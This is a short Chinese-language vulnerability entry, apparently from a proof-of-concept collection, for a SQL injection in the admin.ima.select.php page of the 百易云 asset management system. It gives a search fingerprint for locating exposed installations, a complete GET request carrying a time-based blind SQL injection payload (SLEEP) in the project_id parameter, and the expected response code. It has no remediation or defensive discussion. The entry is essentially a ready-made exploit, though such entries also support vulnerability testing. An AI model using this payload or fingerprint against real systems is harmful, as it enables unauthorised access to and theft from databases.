# 百易云资产管理系统admin.ima.select.php存在SQL注入漏洞

百易云资产管理系统admin.ima. ｜ SQL注入 ｜ —
- **指纹**：`body="media/css/uniform.default.css"`
- **请求**：`GET /wuser/admin.ima.select.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(3)))OKTO)`
- **响应特征**：200